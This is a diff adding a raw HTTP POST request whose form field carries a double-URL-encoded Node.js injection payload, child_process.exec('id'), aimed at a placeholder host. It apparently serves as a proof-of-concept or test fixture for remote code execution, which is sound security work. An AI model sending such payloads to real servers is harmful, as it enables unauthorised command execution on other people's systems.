@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Connection: close
+
+file=n%253Dchild_process.exec%2528%2527id%2527%2529
